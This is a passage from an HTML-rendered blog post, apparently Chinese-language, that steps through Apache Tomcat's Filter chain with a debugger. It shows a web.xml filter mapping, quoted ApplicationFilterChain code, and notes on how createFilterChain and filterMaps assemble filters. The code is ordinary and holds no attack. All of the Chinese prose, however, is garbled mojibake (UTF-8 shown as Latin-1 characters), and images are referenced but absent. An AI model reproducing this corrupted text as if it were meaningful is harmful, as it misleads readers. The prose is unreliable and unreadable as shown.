</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åweb.xmlä¸­æ·»åŠ ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">xmlns=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">version=</span><span class="s">&#34;4.0&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>filter<span class="nt">&lt;/filter-name&gt;</span> <span class="c">&lt;!--åå­— --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-class&gt;</span>filter.TestFilter<span class="nt">&lt;/filter-class&gt;</span><span class="c">&lt;!--ä½ç½® --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>filter<span class="nt">&lt;/filter-name&gt;</span><span class="c">&lt;!--è°ƒç”¨ --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/filter<span class="nt">&lt;/url-pattern&gt;</span><span class="c">&lt;!--è¡¨ç¤ºè®¿é—®filterè·¯ç”±çš„webèµ„æºéƒ½æ˜¯è¢«æ‹¦æˆªï¼Œè€Œ/*è¡¨ç¤ºæ‰€æœ‰çš„URLéƒ½ä¼šè¢«æ‹¦æˆª --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>filter1<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-class&gt;</span>filter.TestDemo<span class="nt">&lt;/filter-class&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>filter1<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/filter<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åè¿è¡ŒtomcatæœåŠ¡å™¨ï¼Œè®¿é—®filterè·¯ç”±ï¼ŒæˆåŠŸè¾“å‡ºåœ¨æ§åˆ¶å°ä¸Šï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055412.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831151154581"
	
	
></p>
<p>ç°åœ¨è¿™é‡Œå°±å°è¯•ä¸€ä¸‹è°ƒè¯•ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>è¿™é‡Œéœ€è¦å¯¼å…¥catalina.jaråŒ…æ¥æ›´å¥½çœ‹ä¸€äº›ï¼Œè¿™ä¸ªåŒ…åœ¨tomcatçš„<code>lib</code>ç›®å½•ä¸‹ï¼Œç›´æ¥åœ¨ideaé‡Œé¢æ‹‰è¿›å»å³å¯ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055713.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240830225911025"
	
	
></p>
<p>ç„¶åå°±å¯ä»¥äº†ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>ç„¶åæˆ‘ä»¬åœ¨TestFilterr.javaçš„filterChainçš„doFilteræ‰“æ–­ç‚¹ï¼Œç„¶åå¼€å§‹è°ƒè¯•ã€‚</p>
<p>å¼€å¯è°ƒè¯•åï¼Œå†è®¿é—®ä¸€ä¸‹ /filter å³å¯æˆåŠŸæ–­ä¸Šï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055721.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831151501951"
	
	
></p>
<p>çœ‹ä¸€ä¸‹è¿™é‡Œçš„å‚æ•°æƒ…å†µï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055083.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831151520886"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸‰ä¸ªfilterï¼Œè¿™é‡Œ<strong>ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªfilteréƒ½æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„filterï¼Œç¬¬ä¸‰ä¸ªfilteræ˜¯tomcatè‡ªå¸¦çš„filter</strong>ã€‚æ­¤æ—¶çš„filterChainä¸ºApplicationFilterChainç±»å®ä¾‹ï¼Œæ‰€ä»¥æ­¤æ—¶ä¼šè°ƒç”¨ApplicationFilterChainçš„doFilter()æ–¹æ³•ã€‚</p>
<p>å•å‡»F7è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªfilterChainçš„doFilter()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055006.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831122140979"
	
	
></p>
<p>è¿™é‡Œçš„ifè¿›è¡Œäº†Globals.IS_SECIRITY_ENABLEDåˆ¤æ–­ï¼Œçœ‹æ˜¯å¦å¼€å¯äº†å…¨å±€å®‰å…¨æœåŠ¡ã€‚</p>
<p>F7è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œæ²¡æœ‰è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œç›´æ¥åˆ°äº†elseå†…çš„ä»£ç ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055174.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831135609002"
	
	
></p>
<p>ç„¶åè¿™é‡Œå°±ä¼šè°ƒç”¨ApplicationFilterChainçš„internalDoFilter()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055407.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831152021446"
	
	
></p>
<p>çœ‹å‚æ•°ï¼Œæ— ç–‘ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œåˆ©ç”¨ä»£ç ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ApplicationFilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">filters</span><span class="o">[</span><span class="k">this</span><span class="p">.</span><span class="na">pos</span><span class="o">++]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Filter</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">.</span><span class="na">getFilter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">isAsyncSupported</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">filterConfig</span><span class="p">.</span><span class="na">getFilterDef</span><span class="p">().</span><span class="na">getAsyncSupportedBoolean</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">request</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&#34;org.apache.catalina.ASYNC_SUPPORTED&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Boolean</span><span class="p">.</span><span class="na">FALSE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Globals</span><span class="p">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Principal</span><span class="w"> </span><span class="n">principal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="n">request</span><span class="p">).</span><span class="na">getUserPrincipal</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">SecurityUtil</span><span class="p">.</span><span class="na">doAsPrivilege</span><span class="p">(</span><span class="s">&#34;doFilter&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">filter</span><span class="p">,</span><span class="w"> </span><span class="n">classType</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">principal</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">filter</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå°±è°ƒç”¨äº†filterså˜é‡ï¼Œè¿™ä¸ªå˜é‡åœ¨ç±»ä¸­æ˜¯å®šä¹‰çš„äº†ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055313.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831140418342"
	
	
></p>
<p>å¹¶ä¸”çœ‹æ­¤æ—¶çš„å˜é‡å¯¹åº”æƒ…å†µï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055317.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831152332704"
	
	
></p>
<p>å’Œä¹‹å‰ä¸€æ ·ï¼Œæœ‰ä¸‰ä¸ªè¿‡æ»¤å™¨ã€‚ç„¶å<strong>ç»§ç»­çœ‹ifæ¡ä»¶è¯­å¥é‡Œé¢çš„åˆ©ç”¨ä»£ç </strong>ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055533.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831152826245"
	
	
></p>
<p>æ­¤æ—¶posçš„å€¼ä¸º1ï¼Œå¹¶ä¸”è¿™é‡Œçš„pos++æ˜¯åç½®çš„ï¼Œæ‰€ä»¥ä¼šå…ˆè·å–åˆ°filtersæ•°ç»„ä¸‹æ ‡ä¸º1çš„filterï¼Œç„¶åå†+1ï¼Œæ‰€ä»¥æ­¤æ—¶ä¼šè·å–åˆ°æˆ‘ä»¬å®šä¹‰çš„ç¬¬äºŒä¸ªfilterã€‚</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055660.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831153117022"
	
	
></p>
<p>éªŒè¯æˆåŠŸã€‚</p>
<p>ç„¶åå°±æ˜¯è°ƒç”¨ getFilter()æ–¹æ³•è·å–åˆ°ç±»å®ä¾‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055888.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831153343451"
	
	
></p>
<p>ç„¶åè¿™é‡Œçš„ifæ¡ä»¶åŒæ ·ä¸ä¼šè¿›å…¥ï¼Œç›´æ¥è¿›å…¥elseè°ƒç”¨TestDemoçš„doFilter()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055849.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831153501006"
	
	
></p>
<p>é¡ºç†æˆç« ï¼Œç¬¬äºŒä¸ªè‡ªå®šä¹‰çš„TestDemoçš„doFilter()æ–¹æ³•æ˜¯åŒæ ·çš„ï¼Œç„¶åå°±ä¼šåˆ°Tomcatè‡ªå¸¦çš„filterï¼Œå³WsFilterï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055872.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831153924890"
	
	
></p>
<p>äºæ˜¯è¿›å…¥åˆ°äº†WsFilterç±»çš„doFilter()æ–¹æ³•:</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055044.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831154325882"
	
	
></p>
<p>è¿™é‡Œçš„ifæ¡ä»¶æ²¡æœ‰é€šè¿‡ï¼Œç›´æ¥è¿›å…¥elseè¯­å¥ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055525.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831154430365"
	
	
></p>
<p>è¿™é‡Œçš„chainç±»å®ä¾‹ä¸ºApplicationFilterChainï¼Œåˆä¼šè°ƒç”¨ä¸€æ¬¡doFilter()æ–¹æ³• ==ã€‹å†è°ƒç”¨internalDoFilter()æ–¹æ³•ï¼Œä½†æ˜¯æ­¤æ—¶åœ¨è¿™ä¸ªinternalFilter()æ–¹æ³•ä¸­ï¼Œå‰é¢æˆ‘ä»¬éƒ½æ˜¯æ»¡è¶³äº†è¿™ä¸ªifæ¡ä»¶ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055333.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831155542858"
	
	
></p>
<p>ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰æ»¡è¶³ï¼Œç›´æ¥è¿›å…¥elseè¯­å¥ï¼Œå†ç„¶åçš„ä¸€æ­¥ä¸€æ­¥çš„æ¡ä»¶åˆ¤æ–­ï¼Œæœ€åä¼šè°ƒç”¨servletçš„service()æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055381.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831160128020"
	
	
></p>
<p>ä¹Ÿå°±æ˜¯è¯´æœ€åä¸€ä¸ªFilterä¼šè°ƒç”¨service()æ–¹æ³•æ¥å¤„ç†webè¯·æ±‚ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<p>æ­£å‘åˆ†æfilteræµç¨‹åˆ†æç»“æŸã€‚</p>
<h5 id="filterå‰æµç¨‹åˆ†æ">/filterå‰æµç¨‹åˆ†æ
</h5><p>åœ¨doFilter() æ–¹æ³•ä¹‹å‰ï¼Œæ•´ä¸ªæµç¨‹å¦‚å›¾ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055594.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831162123763"
	
	
></p>
<p>ã€‚åœ¨å‰é¢æˆ‘ä»¬æ—¶ç›´æ¥åˆ†æçš„è®¿é—®filteré“¾ä¹‹åçš„è¿‡ç¨‹ï¼Œç°åœ¨å°±ä¸»è¦ç€é‡äºfiltersæ˜¯å¦‚ä½•è¢«èµ‹å€¼çš„ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055497.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831163731729"
	
	
></p>
<p>åœ¨å‰é¢ä¹Ÿåˆ†æè¿‡äº†ï¼Œå…¶å®è¿™é‡Œçš„filterrConfigå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªfilterï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å°±çœ‹ä¸€ä¸‹è¿™ä¸ªfiltersæ˜¯å¦‚ä½•èµ‹å€¼çš„ï¼ˆè¿™ä¸ªfilterså³æ‰€å±ApplicationFilterChainç±»çš„å˜é‡ï¼‰ã€‚</p>
<p>å‘ç°åœ¨ StandardWrapperValve ç±»çš„invokeæ–¹æ³•ä¸­æœ‰è¿™ä¸ªå®šä¹‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ApplicationFilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ApplicationFilterFactory</span><span class="p">.</span><span class="na">createFilterChain</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">wrapper</span><span class="p">,</span><span class="w"> </span><span class="n">servlet</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰“æ–­ç‚¹è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªApplicationFilterFactoryç±»çš„createFilterChain()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055396.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831164545082"
	
	
></p>
<p>è¿™é‡Œè¿›å…¥åˆ°äº†elseè¯­å¥ï¼Œç„¶åç»§ç»­å°±æ˜¯èµ‹å€¼filterChainï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055942.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831164839282"
	
	
></p>
<p>ï¼ˆæ ‡çº¢çš„å³è¿›å…¥çš„è¯­å¥ï¼‰</p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç¡®å®å°†filterChainèµ‹å€¼ä¸ºäº† ApplicationFilterChainç±»çš„å®ä¾‹ã€‚</p>
<p>ä½†<strong>ç°åœ¨åªæ˜¯ä¸€ä¸ªç©ºçš„ApplicationFilterChainå¯¹è±¡</strong>ã€‚</p>
<p>å†å¾€åçœ‹ï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">StandardContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">wrapper</span><span class="p">.</span><span class="na">getParent</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">FilterMap</span><span class="o">[]</span><span class="w"> </span><span class="n">filterMaps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">findFilterMaps</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è°ƒç”¨getParent()è·å–å½“å‰çš„Contextï¼Œä¹Ÿå°±æ˜¯å½“å‰çš„åº”ç”¨ï¼Œç„¶åä»Contextä¸­è·å–filterMapsï¼Œ<strong>filtermapså°±æ˜¯web.xmlä¸­æˆ‘ä»¬å†™å…¥çš„filter</strong>ã€‚</p>
<p>å†ç„¶åå°±æ˜¯éå†è¿™ä¸ªæ•°ç»„ä¸­çš„å€¼ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055924.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831170716085"
	
	
></p>
<p>é‡ç‚¹éƒ½æ ‡å‡ºæ¥äº†ï¼Œè¿™é‡Œå°±æ˜¯éå†filterMapã€‚å†æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªforå¾ªç¯å…·ä½“ä»£ç ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055989.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831171951500"
	
	
></p>
<p>å¦‚æœå½“å‰è¯·æ±‚çš„urlä¸FilterMapä¸­çš„urlPatternåŒ¹é…ï¼Œå°±ä¼šè°ƒç”¨ findFilterConfig æ–¹æ³•åœ¨ filterConfigs ä¸­å¯»æ‰¾å¯¹åº” filterNameåç§°çš„ FilterConfigï¼Œç„¶åå¦‚æœä¸ä¸ºnullï¼Œå°±è¿›å…¥elseè¯­å¥ï¼Œå°†filterConfigæ·»åŠ åˆ°filterChainä¸­ï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªApplicationFilterChainç±»çš„addFIlter()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055099.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831172128811"
	
	
></p>
<p>å¾ˆæ˜æ˜¾å°±æ˜¯å°†filteréƒ½è£…è¿›å…ˆå‰å®šä¹‰çš„ApplicationFilterChainçš„filtersä¸­ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p><strong>filterChainå®ä¾‹èµ‹å€¼å¤§æ¦‚å°±æ˜¯è¿™æ ·</strong>ã€‚</p>
<p>æˆ‘ä»¬å†å›åˆ°StandardWrapperValveç±»ä¸­ï¼Œåœ¨invokeä¹‹åçš„ä»£ç ä¸­ï¼Œæœ‰è°ƒç”¨filterChain çš„ doFIlter() æ–¹æ³•ï¼Œæœ‰ä¸¤ä¸ªï¼Œè°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°ç¡®å®ä¼šè°ƒç”¨å…¶ä¸­ä¸€ä¸ªdoFIlter()æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055660.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831172745244"
	
	
></p>
<p>ç„¶åè‡ªç„¶å°±ä¼šè°ƒç”¨ApplicationFilterChainç±»çš„doFIlter()æ–¹æ³•ï¼Œç„¶åè°ƒç”¨internalDoFilter()æ–¹æ³•ï¼Œè¿‡ç¨‹åœ¨å‰é¢çš„Filteré“¾çš„ä¹Ÿæœ‰è¯´ã€‚</p>
<p>åªä¸è¿‡è¿™é‡Œè¿˜æ˜¯æœ‰ä¸åŒçš„ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055525.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831173230857"
	
	
></p>
<p>è¿™é‡Œçš„nå°±åªä¸º1ï¼Œæ‰€ä»¥è¿™é‡Œè·å–åˆ°çš„filterç›´æ¥å°±æ˜¯æˆ‘ä»¬å‰é¢è°ƒç”¨åˆ†ææ—¶æœ€åçš„<strong>tomcatè‡ªå¸¦çš„WsFilter</strong>ã€‚</p>
<p><strong>åé¢ä¹Ÿå°±æ˜¯å‰é¢åˆ†æè¿‡äº†çš„ï¼Œç®€å•ç»™ç»™æµç¨‹ï¼š</strong>
WsFilter#doFilter == &gt; ApplicationFilterChain#doFilter ==&gt; ApplicationFilterChain#internalDoFilter</p>
<p>ç„¶ååŒæ ·è°ƒç”¨äº†service()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055138.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831173943681"
	
	
></p>
<p>è¿™é‡Œæ˜¯<strong>å› ä¸ºæˆ‘ä»¬è®¿é—®çš„æ˜¯/ï¼Œåœ¨/è·¯ç”±æˆ‘ä»¬æ²¡æœ‰è‡ªå®šä¹‰filter</strong>ï¼Œæ‰€ä»¥è¿™é‡Œå°±åªä¼šè°ƒç”¨ä¸€æ¬¡doFilterã€‚</p>
<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬è®¿é—®<code>/filter</code>è·¯ç”±ï¼Œå°±è¿˜ä¼šè¿›è¡Œä¸€æ¬¡ä¸Šé¢çš„è¿‡ç¨‹ï¼Œåªä¸è¿‡å°±æ˜¯æˆ‘ä»¬å‰é¢çš„åˆ†æFilter é“¾çš„æµç¨‹ã€‚</p>
<h5 id="è¡¥å……">è¡¥å……
</h5><p>è¡¥å……ä¸€ä¸‹å‰é¢çš„createFilterChain()æ–¹æ³•ä¸­è·å–contextéƒ¨åˆ†çš„åœ°æ–¹ï¼Œæˆ‘è¿™é‡Œæ˜¯<strong>ç”¨ä¸Šäº†è‡ªå®šä¹‰çš„ä¸¤ä¸ªfilter</strong>ï¼Œå¦‚ä¸‹ä»£ç ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055460.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240831195228597"
	
	
></p>
